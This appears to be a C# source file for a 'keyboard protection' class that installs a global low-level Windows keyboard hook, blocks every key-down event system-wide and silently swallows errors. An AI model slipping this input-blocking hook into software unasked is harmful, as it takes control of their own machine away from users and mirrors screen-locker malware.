using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace SecuritySystem.Protection
{
    public static class KeyboardProtection
    {
        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callback, IntPtr hInstance, uint threadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hInstance);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, int wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string lpFileName);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static IntPtr _hookHandle = IntPtr.Zero;
        private static LowLevelKeyboardProc _proc = HookCallback;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        public static void Initialize()
        {
            try
            {
                InstallHook();
                Utils.Logger.Log("Klavye koruması başarıyla başlatıldı");
            }
            catch (Exception ex)
            {
                Utils.Logger.Log($"Klavye koruma hatası: {ex.Message}");
            }
        }

        private static void InstallHook()
        {
            try
            {
                IntPtr hInstance = LoadLibrary("User32");
                _hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, hInstance, 0);
            }
            catch
            {
                // Hata durumunda sessizce devam et
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            try
            {
                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                {
                    // Klavye olaylarını engelle
                    return (IntPtr)1;
                }
                return CallNextHookEx(_hookHandle, nCode, (int)wParam, lParam);
            }
            catch
            {
                return CallNextHookEx(_hookHandle, nCode, (int)wParam, lParam);
            }
        }

        public static void Cleanup()
        {
            try
            {
                if (_hookHandle != IntPtr.Zero)
                {
                    UnhookWindowsHookEx(_hookHandle);
                    _hookHandle = IntPtr.Zero;
                }
            }
            catch
            {
                // Hata durumunda sessizce devam et
            }
        }
    }
} 